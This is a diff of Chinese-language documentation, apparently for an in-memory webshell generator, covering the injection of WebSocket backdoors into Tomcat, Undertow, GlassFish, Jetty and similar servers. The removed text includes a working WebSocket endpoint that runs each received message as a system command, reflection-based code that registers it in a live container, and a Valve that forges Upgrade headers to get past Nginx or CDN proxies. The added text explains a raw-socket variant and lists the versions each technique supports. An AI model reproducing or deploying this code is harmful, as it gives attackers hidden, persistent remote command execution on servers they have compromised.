@@ -2,374 +2,126 @@
 title: Tomcat WebSocket
 ---
 
-## 关于 WebSocket
+## WebSocket（JSR-356）
 
-WebSocket 是一种网络技术，可通过单个 TCP 套接字连接在客户端和服务器之间即时传送双向、全双工信息。它被广泛用于实时应用程序，如聊天应用程序、在线游戏和实时数据流。
-
-Java WebSocket 1.0（JSR 356）是 Java EE 7 的一部分，定义了用于在 Java 平台上创建 WebSocket 应用程序的 API。Tomcat 从版本 7.0.27 开始支持 Java WebSocket API。
-
-## 定义 Endpoint
-
-JSR 356 定义了两种方式来声明 Endpoint：注解式和接口式。注解式使用注解（如 @ServerEndpoint），而接口式通过实现 Endpoint 类。而注入内存马的场景主要是用于动态添加，因此仅介绍接口式。
+Java WebSocket 1.0（JSR 356）把 Endpoint 的注册交给中间件：容器启动时初始化
+`ServerContainer` 并放进 `ServletContext`（javax 命名空间的 key 为
+`javax.websocket.server.ServerContainer`，jakarta 为 `jakarta.websocket.server.ServerContainer`）。
+注入器反射取到该容器后，用 `ServerEndpointConfig.Builder` 构建配置并调用 `addEndpoint`
+注册恶意 `Endpoint`：
 
 ```java
-import javax.websocket.Endpoint;
-import javax.websocket.EndpointConfig;
-import javax.websocket.MessageHandler;
-import javax.websocket.Session;
-import javax.websocket.CloseReason;
-import java.io.IOException;
-
-public class ExampleEndpoint extends Endpoint {
-
-    @Override
-    public void onOpen(final Session session, EndpointConfig config) {
-        System.out.println("连接已打开：" + session.getId());
-        session.addMessageHandler(new MessageHandler.Whole<String>() {
-            @Override
-            public void onMessage(String message) {
-                System.out.println("收到消息：" + message);
-                try {
-                    session.getBasicRemote().sendText("Echo: " + message);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        });
-    }
-
-    @Override
-    public void onClose(Session session, CloseReason closeReason) {
-        System.out.println("连接关闭：" + session.getId());
-    }
-
-    @Override
-    public void onError(Session session, Throwable thr) {
-        System.out.println("发生错误：" + thr.getMessage());
-    }
-}
+Object container = invokeMethod(servletContext, "getAttribute",
+        new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
+Object builder = invokeMethod(ServerEndpointConfig.Builder.class, "create",
+        new Class[]{Class.class, String.class}, new Object[]{shell.getClass(), urlPattern});
+invokeMethod(container, "addEndpoint",
+        new Class[]{ServerEndpointConfig.class},
+        new Object[]{invokeMethod(builder, "build", null, null)});
 ```
 
-通过继承 `javax.websocket.Endpoint` 类，在 `onOpen` 方法中注册消息处理器。
+Endpoint 只需要实现 `onOpen` / `onMessage`：WebSocket 帧由容器负责，消息回调里执行命令或转发字节流。
+这条路线依赖容器自带的 WebSocket 实现，Tomcat 7+、Undertow、WebLogic 12+、GlassFish 4+ / Payara 5+、BES、
+TongWeb、WebSphere 9+ / Liberty、Jetty 9.1+、InforSuite 9/10、Apusic 9.0 均可使用。Jetty 12 默认不加载
+WebSocket 模块，需要启动时启用对应的 `eeN-websocket-javax` / `eeN-websocket-jakarta` 模块。
 
-在内存马场景下，可以在 onMessage 方法中添加恶意逻辑，例如执行系统命令或加载其他恶意代码，以下是命令回显 WebSocket Endpoint 示例：
+Nginx 或 CDN 默认不会转发逐跳头部 `Upgrade` 和 `Connection`，直连可用的 WebSocket 马放到反向代理
+后面会握手失败；这种场景请使用 RawWebSocket。
 
-```java
-import javax.websocket.Endpoint;
-import javax.websocket.EndpointConfig;
-import javax.websocket.MessageHandler;
-import javax.websocket.Session;
-import java.io.InputStream;
-import java.util.Scanner;
 
-public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<String> {
+## RawWebSocket（Tomcat 5 ~ 11 / BES / TongWeb / Undertow / GlassFish / Payara / Jetty）
 
-    private Session session;
+RawWebSocket 不经过容器的 WebSocket 实现，而是由 helper 反射拿到当前 Connector 的底层连接后自己写 101
+响应、跑帧循环。shell 只认 `GET` + `Sec-WebSocket-Key`，不依赖可能被 Nginx/CDN 剥离的 `Upgrade`
+与 `Connection`，因此同一份马既能直连也能放在反向代理后面使用。
+helper 会按 coyote buffer 的实际类型自动选择后端，不需要事先知道 Tomcat 版本或 Connector：
 
-    @Override
-    public void onMessage(String cmd) {
-        try {
-            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-            session.getBasicRemote().sendText(new Scanner(inputStream).useDelimiter("\\A").next());
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-    }
+- Tomcat 5/6/7/8.0 的 BIO：`InternalInputBuffer.inputStream` / `InternalOutputBuffer.outputStream`；
+- Tomcat 7/8.0 的 APR：`InternalApr*Buffer.socket` + `org.apache.tomcat.jni.Socket`；
+- Tomcat 7/8.0 的 NIO：`NioChannel` + `NioSelectorPool`；
+- Tomcat 8.0 的 NIO2：`SocketWrapper<Nio2Channel>` 的 Future 式 read/write；
+- Tomcat 8.5+：`SocketWrapperBase` 的阻塞 read/write，覆盖 NIO / NIO2 / APR。
 
-    @Override
-    public void onOpen(final Session session, EndpointConfig config) {
-        this.session = session;
-        session.addMessageHandler(this);
-    }
-}
-```
+BES 9.5.2+ / 10 与 TongWeb 6/7/8 是改了包名的 Tomcat 分支。helper 不写死 `org.apache.*`
+类名：ActionCode 从 `Response.action` 的形参反查，NioSelectorPool 的 read/write 按方法签名匹配，
+BIO/APR/SocketWrapper 按 buffer 字段结构识别，因此这些分支的 BIO / NIO / SocketWrapper 后端可以直接复用。
 
-## 注册 Endpoint
+生成期按 `<shellClassName>$RawWsHelper` 重命名 helper 并嵌入注入器；注入器先 defineClass helper 再实例化
+shell。shell 以 GET + `Sec-WebSocket-Key` 触发，调用 `helper.equals(new Object[]{request, response, this})`
+后由 helper 接管连接，helper 再反射回调 shell 的 `onReadBinary` / `onReadText` / `onDisconnect`。
+容器相关的反射都收在 helper 里，Command/Godzilla/Proxy 的 shell 模板可以共用。
 
-通过继承 javax.websocket.server.ServerApplicationConfig 实现动态注册 Endpoint：
+Tomcat 10/11 使用 `JakartaRawWebSocket`：模板仍是同一份 javax 源码，生成期由 JakartaPostProcessor 统一
+重命名到 `jakarta.*` 命名空间，helper 本身只依赖 JDK。
 
-```java
-import javax.websocket.Endpoint;
-import javax.websocket.server.ServerApplicationConfig;
-import javax.websocket.server.ServerEndpointConfig;
-import java.util.HashSet;
-import java.util.Set;
+JBoss AS 4~7.1 / EAP6 的 JBossWeb 是 Tomcat 分支，服务类型选择 JBoss 即可复用同一份 helper。
+JBoss EAP7+ / WildFly 使用 Undertow：helper 从 servlet request/response 取出
+`HttpServerExchange`，调用 `upgradeChannel` 让 Undertow 在刷出 101 响应后交出
+`org.xnio.StreamConnection`，再由 helper 跑帧循环；同时强制 exchange 为持久连接，
+避免 Nginx 把 `Connection` 改成 `close` 后连接被直接回收。helper 只依赖 JDK，
+Undertow 1.x ~ 2.3.x 的 javax / Jakarta 部署共用同一份实现。
 
-public class WebSocketConfig implements ServerApplicationConfig {
-    @Override
-    public Set<ServerEndpointConfig> getEndpointConfigs(Set<Class<? extends Endpoint>> scannedEndpointClasses) {
-        Set<ServerEndpointConfig> result = new HashSet<>();
-        ServerEndpointConfig config = ServerEndpointConfig.Builder
-                .create(ExampleEndpoint.class, "/api/ws")
-                .build();
+GlassFish/Payara 使用 Grizzly，helper 按连接器版本接管底层 `SocketChannel`：
 
-        result.add(config);
+- GlassFish 3 的 Grizzly 1.x：从 `com.sun.grizzly.tcp.Response.getChannel()` 取 channel，
+  `suspend()` 后取消原 SelectionKey；
+- GlassFish 4+ / Payara 的 Grizzly 2.x：从 `Request.getContext().getConnection()` 取
+  `NIOConnection`，`detachSelectorRunner()` 后 `Response.suspend()`。
 
-        return result;
-    }
+两代 Grizzly 都在写完 101 后用自己的 Selector 跑非阻塞帧循环，容器不再回收该请求。
+GlassFish 3 ~ 8、Payara 5 ~ 7 已覆盖；Apusic/Primeton 等基于 GlassFish 二开的产品如果替换了连接器，
+需要实测。
 
-    @Override
-    public Set<Class<?>> getAnnotatedEndpointClasses(Set<Class<?>> scanned) {
-        return scanned;
-    }
-}
-```
+Jetty 6 ~ 12 的 RawWebSocket 从 `Request` 逐层找到 `EndPoint`，写完 101 后直接在 EndPoint 上跑
+帧循环：Jetty 6/7/8 走 `org.mortbay.io.Buffer` / `org.eclipse.jetty.io.Buffer`，Jetty 9+ 走
+`ByteBuffer`，TLS 由 Jetty 自身处理，javax / Jakarta 共用同一份 helper。
 
-在 Tomcat 中 org.apache.tomcat.websocket.server.WsSci 会扫描并注册实现了 ServerApplicationConfig 的类，从而动态添加 WebSocket Endpoint。
+## 版本支持
 
-```java
-@HandlesTypes({ServerEndpoint.class, ServerApplicationConfig.class,
-        Endpoint.class})
-public class WsSci implements ServletContainerInitializer {
-    @Override
-    public void onStartup(Set<Class<?>> clazzes, ServletContext ctx)
-            throws ServletException {
-        WsServerContainer sc = init(ctx, true);
-        // 扫描继承的 ServerApplicationConfig 类，并调用其 getEndpointConfigs 方法
-        Set<ServerEndpointConfig> filteredEndpointConfigs = ...;
-        try {
-            for (ServerEndpointConfig config : filteredEndpointConfigs) {
-                sc.addEndpoint(config); // [!code highlight]
-            }
-            // ...
-        } catch (DeploymentException e) {
-            throw new ServletException(e);
-        }
-    }
+WebSocket / JakartaWebSocket 通过容器的 JSR-356 `ServerContainer` 注册 `Endpoint`；
+RawWebSocket 不依赖容器的 WebSocket 实现。两者都要求对应容器支持 Filter 注入：
 
-    static WsServerContainer init(ServletContext servletContext, boolean initBySciMechanism) {
-        WsServerContainer sc = new WsServerContainer(servletContext);
-        servletContext.setAttribute("javax.websocket.server.ServerContainer", sc); // [!code highlight]
-        // ...
-        return sc;
-    }
-}
-```
+| 容器                               | WebSocket | JakartaWebSocket | RawWebSocket | JakartaRawWebSocket |
+| ---------------------------------- | :-------: | :--------------: | :----------: | :-----------------: |
+| Tomcat 5.x / 6.x                   |           |                  |      ✔️      |                     |
+| Tomcat 7.x                         |    ✔️     |                  |      ✔️      |                     |
+| Tomcat 8.x / 9.x                   |    ✔️     |                  |      ✔️      |                     |
+| Tomcat 10.x / 11.x                 |           |       ✔️        |              |         ✔️         |
+| Undertow 1.x ~ 2.2.x               |    ✔️     |                  |      ✔️      |                     |
+| Undertow 2.3.x+ / WildFly 27+      |           |       ✔️        |              |         ✔️         |
+| GlassFish 3.x                      |           |                  |      ✔️      |                     |
+| GlassFish 4.x ~ 5.x / Payara 5.x   |    ✔️     |                  |      ✔️      |                     |
+| GlassFish 6.x+ / Payara 6.x+       |           |       ✔️        |              |         ✔️         |
+| BES 9.5.1                          |    ✔️     |                  |              |                     |
+| BES 9.5.2 ~ 10.x                   |    ✔️     |                  |      ✔️      |                     |
+| BES 11.x                           |           |       ✔️        |              |         ✔️         |
+| TongWeb 6.0.x                      |           |                  |      ✔️      |                     |
+| TongWeb 6.0.7 ~ 8.x                |    ✔️     |                  |      ✔️      |                     |
+| TongWeb 7.x 内嵌 Spring Boot       |           |       ✔️        |              |         ✔️         |
+| WebSphere 8.5.5.x                  |           |                  |      ✔️      |                     |
+| WebSphere 9.x                      |    ✔️     |                  |      ✔️      |                     |
+| Open Liberty 18+                   |    ✔️     |                  |              |                     |
+| Jetty 6.x ~ 8.x                    |           |                  |      ✔️      |                     |
+| Jetty 9.x ~ 10.x                   |    ✔️     |                  |      ✔️      |                     |
+| Jetty 11.x                         |           |       ✔️        |              |         ✔️         |
+| Jetty 12.x ee8                     |    ✔️     |                  |      ✔️      |                     |
+| Jetty 12.x ee9 ~ ee11              |           |       ✔️        |              |         ✔️         |
+| InforSuite 9 / 10                  |    ✔️     |                  |      ✔️      |                     |
+| Apusic 9.0                         |    ✔️     |                  |      ✔️      |                     |
+| Apusic 9.0.1                       |           |                  |      ✔️      |                     |
 
-代码中有两个关键的地方：
+Tomcat 5/6 没有 JSR-356 实现，请使用 RawWebSocket；Tomcat 10/11 选择
+JakartaRawWebSocket。TongWeb 7.x 内嵌 Spring Boot 使用 Jakarta 命名空间，同样选择
+JakartaRawWebSocket。WebSphere 8.5.5 默认安装没有 `com.ibm.ws.wsoc`，需要额外安装
+WebSocket 1.0 功能。Jetty 12 需要启动时启用对应的 `eeN-websocket-javax` / `eeN-websocket-jakarta`
+模块。Apusic 9.0.1 没有 Tyrus，只能选择 RawWebSocket。RawWebSocket 与容器的 WebSocket 实现互不影响，
+可以在同一容器里共存。
 
-1. init 方法中，注册的 WsServerContainer 对象会被放入 ServletContext 中，key 为 "javax.websocket.server.ServerContainer"，高版本为 "jakarta.websocket.server.ServerContainer"。
-2. 调用 WsServerContainer 的 addEndpoint 方法注册 Endpoint。
+## 限制
 
-因此，我们可以通过 ServletContext 获取 WsServerContainer 对象，初始化 Endpoint 并且构建 ServerEndpointConfig 最后调用 addEndpoint 方法注册我们的恶意 Endpoint。
-
-```java
-private void inject(Object context, Object obj) throws Exception {
-    Object servletContext = invokeMethod(context, "getServletContext", null, null);
-    Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
-    if (container == null) {
-        container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
-    }
-
-    if (container == null) {
-        throw new RuntimeException("container is null");
-    }
-
-    if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
-        return;
-    }
-
-    ClassLoader contextClassLoader = context.getClass().getClassLoader();
-    Class<?> serverEndpointConfigClass;
-    Class<?> builderClass;
-    try {
-        serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
-        builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
-    } catch (ClassNotFoundException e) {
-        serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
-        builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
-    }
-    Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
-    constructor.setAccessible(true);
-    Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
-    Object endpointConfig = invokeMethod(o1, "build", null, null);
-
-    invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
-    invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
-    invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
-}
-```
-
-## 绕过 Nginx 或 CDN 限制
-
-由于在 Tomcat 中实现 WebSocket 使用的是 Upgrade 协议，因此需要 `Upgrade: websocket` 和 `Connection: upgrade` 来将请求转为 WebSocket 连接，Nginx 或 CDN 默认情况下根本不会转发这些头部，甚至会设置 `Connection: close` 导致无法连接到 WebSocket 内存马。以下是尝试在 Nginx 的情况下连接 WebSocket 所能拿到的请求头部：
-
-```txt
-host = 127.0.0.1
-x-real-ip = 192.168.97.1
-x-forwarded-for = 192.168.97.1
-x-forwarded-proto = http
-connection = close
-sec-websocket-version = 13
-sec-websocket-key = 4yY8pZQPUv6RlRoPgh7SaA==
-sec-websocket-extensions = permessage-deflate; client_max_window_bits
-```
-
-在实现细节上，Tomcat 默认会注册一个名为 `org.apache.tomcat.websocket.server.WsFilter` 的 Filter，用于将 HTTP 请求升级为 WebSocket 协议。
-
-首先会在 `UpgradeUtil.isWebSocketUpgradeRequest` 判断请求头里面有没有 `Upgrade: websocket` 以及是不是 GET 请求。
-其次在 `UpgradeUtil.doUpgrade` 方法中会检查 `Connection: upgrade` 以及 `Sec-WebSocket-Version: 13`，如果没有这些头部就会直接返回 400 或 426 错误码。
-
-```java
-public class WsFilter implements Filter {
-    private WsServerContainer sc;
-
-    public void init(FilterConfig filterConfig) throws ServletException {
-        this.sc = (WsServerContainer)filterConfig.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
-    }
-
-    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
-        if (this.sc.areEndpointsRegistered()
-                && UpgradeUtil.isWebSocketUpgradeRequest(request, response)) {
-            HttpServletRequest req = (HttpServletRequest)request;
-            HttpServletResponse resp = (HttpServletResponse)response;
-            String pathInfo = ...; // 获取请求路径
-            WsMappingResult mappingResult = this.sc.findMapping(path);
-            if (mappingResult != null) {
-                UpgradeUtil.doUpgrade(this.sc, req, resp, mappingResult.getConfig(), mappingResult.getPathParams());
-            }
-        }
-        chain.doFilter(request, response);
-    }
-}
-```
-
-```java
-public class UpgradeUtil {
-
-    public static boolean isWebSocketUpgradeRequest(ServletRequest request, ServletResponse response) {
-        return request instanceof HttpServletRequest
-                && response instanceof HttpServletResponse
-                && headerContainsToken((HttpServletRequest)request, "Upgrade", "websocket")  // [!code highlight]
-                && "GET".equals(((HttpServletRequest)request).getMethod());
-    }
-
-    public static void doUpgrade(WsServerContainer sc, HttpServletRequest req, HttpServletResponse resp, ServerEndpointConfig sec, Map<String, String> pathParams) throws ServletException, IOException {
-        String subProtocol = null;
-        if (!headerContainsToken(req, "Connection", "upgrade")) { // [!code highlight]
-            resp.sendError(400);
-        } else if (!headerContainsToken(req, "Sec-WebSocket-Version", "13")) { // [!code highlight]
-            resp.setStatus(426);
-            resp.setHeader("Sec-WebSocket-Version", "13");
-        }
-        // ...
-    }
-}
-```
-
-结合上面通过 Nginx 转发到 Tomcat 的请求头，可以看到缺失的就是 `Upgrade: websocket` 和 `Connection: upgrade` 这两个请求头，导致请求无法进入 WsFilter 的逻辑从而连接失败。因此我们需要创建一个类似 WsFilter 的组件来补充缺失的请求头。考虑到 Filter 和 Valve 的注入代码量，这里选择了更轻量化的 Valve 组件：
-
-```java
-public class TomcatWsBypassValve implements Valve {
-    public static String headerName;
-    public static String headerValue;
-
-    @Override
-    public void invoke(Request request, Response response) throws IOException, ServletException {
-        try {
-            // 因为 Valve 所有请求都会经过，所以需要判断特定流量来防止对业务产生过大的影响
-            if (request.getHeader(headerName) != null
-                    && request.getHeader(headerName).contains(headerValue)) {
-                String pathInfo = request.getPathInfo();
-                String path;
-                if (pathInfo == null) {
-                    path = request.getServletPath();
-                } else {
-                    path = request.getServletPath() + pathInfo;
-                }
-                Object sc = request.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
-                if (sc == null) {
-                    sc = request.getServletContext().getAttribute("jakarta.websocket.server.ServerContainer");
-                }
-                if (sc == null) {
-                    throw new ServletException("Server container not found");
-                }
-                addHeader(request, "Connection", "upgrade");
-                addHeader(request, "Upgrade", "websocket");
-                Object mappingResult = sc.getClass().getMethod("findMapping", String.class).invoke(sc, path);
-                Class<?> upgradeUtil = Class.forName("org.apache.tomcat.websocket.server.UpgradeUtil");
-                for (Method method : upgradeUtil.getMethods()) {
-                    if ("doUpgrade".equals(method.getName())) {
-                        method.invoke(null, sc, request, response, getFieldValue(mappingResult, "config"), getFieldValue(mappingResult, "pathParams"));
-                    }
-                }
-                return;
-            }
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-        this.getNext().invoke(request, response);
-    }
-
-    private void addHeader(Request request, String key, String value) {
-        try {
-            Field coyoteRequestField = request.getClass().getDeclaredField("coyoteRequest");
-            coyoteRequestField.setAccessible(true);
-            Object coyoteRequest = coyoteRequestField.get(request);
-            Method getMimeHeadersMethod = coyoteRequest.getClass().getMethod("getMimeHeaders");
-            Object mimeHeaders = getMimeHeadersMethod.invoke(coyoteRequest);
-            Method addValueMethod = mimeHeaders.getClass().getMethod("addValue", String.class);
-            Object messageBytes = addValueMethod.invoke(mimeHeaders, key);
-            Method setStringMethod = messageBytes.getClass().getMethod("setString", String.class);
-            setStringMethod.invoke(messageBytes, value);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field declaredField = obj.getClass().getDeclaredField(fieldName);
-        declaredField.setAccessible(true);
-        return declaredField.get(obj);
-    }
-
-    //...
-}
-```
-
-因此我们注入能够绕过 Nginx 或 CDN 限制的 WebSocket 内存马，只需要在注入 WebSocket 内存马的基础上额外注入一个 Valve 内存马。
-
-```java
-private void inject(Object context, Object obj) throws Exception {
-    Object servletContext = invokeMethod(context, "getServletContext", null, null);
-    Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
-    if (container == null) {
-        container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
-    }
-
-    if (container == null) {
-        throw new RuntimeException("container is null");
-    }
-
-    if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
-        return;
-    }
-
-    Object valve = defineShell(context.getClass().getClassLoader(), getHelperBase64String()).newInstance(); // [!code ++]
-    Object pipeline = invokeMethod(context, "getPipeline", null, null); // [!code ++]
-    Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve"); // [!code ++]
-    invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve}); // [!code ++]
-
-    ClassLoader contextClassLoader = context.getClass().getClassLoader();
-    Class<?> serverEndpointConfigClass;
-    Class<?> builderClass;
-    try {
-        serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
-        builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
-    } catch (ClassNotFoundException e) {
-        serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
-        builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
-    }
-    Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
-    constructor.setAccessible(true);
-    Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
-    Object endpointConfig = invokeMethod(o1, "build", null, null);
-
-    invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
-    invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
-    invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
-}
-```
+- 仅支持 HTTP/1.1，不支持 HTTP/2 或 HTTP/3。
+- 未实现 `permessage-deflate` 扩展与子协议协商。
+- 单条消息上限 50 MB，超过时以 1009 关闭连接。
 
 ## 相关文档
 
